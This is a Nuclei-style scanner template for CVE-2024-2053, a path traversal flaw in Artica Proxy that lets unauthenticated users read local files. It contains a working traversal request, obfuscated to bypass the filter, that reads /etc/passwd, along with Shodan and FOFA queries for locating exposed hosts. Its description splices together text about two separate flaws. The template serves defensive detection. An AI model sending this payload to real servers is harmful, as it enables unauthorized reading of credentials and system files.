http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - part: body
    type: word
    words:
    - application/force-download
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /images.listener.php?uri=1&mailattach=..././..././..././..././..././epasswdtc/ppasswdasswd
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-2053
info:
  author: pussycat0x
  classification:
    cpe: cpe:2.3:a:articatech:artica_proxy:4.40:*:*:*:*:*:*:*
    cve-id: CVE-2024-2053
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-23
    epss-percentile: 0.96421
    epss-score: 0.29312
  description: 'The Artica Proxy administrative web application will deserialize arbitrary
    PHP objects supplied by unauthenticated users and subsequently enable code execution
    as the "www-data" user. This issue was demonstrated on version 4.50 of the The
    Artica-Proxy administrative web application attempts to prevent local file inclusion.
    These protections can be bypassed and arbitrary file requests supplied by unauthenticated
    users will be returned according to the privileges of the "www-data" user.

    '
  impact: 'Unauthenticated attackers can read arbitrary files on the server including
    configuration files with credentials and other sensitive data.

    '
  metadata:
    fofa-query: body="artica"
    max-request: 1
    product: artica_proxy
    shodan-query: http.html:"artica"
    vendor: articatech
    verified: true
  name: Artica Proxy - Unauthenticated LFI
  reference:
  - https://github.com/0xMarcio/cve/blob/main/2024/CVE-2024-2053.md#cve-2024-2053
  - https://seclists.org/fulldisclosure/2024/Mar/11
  - https://korelogic.com/Resources/Advisories/KL-001-2024-001.txt
  remediation: 'Update Artica Proxy to a version newer than 4.50.

    '
  severity: high
  tags: cve,cve2024,lfi,artica-proxy,articatech,vuln
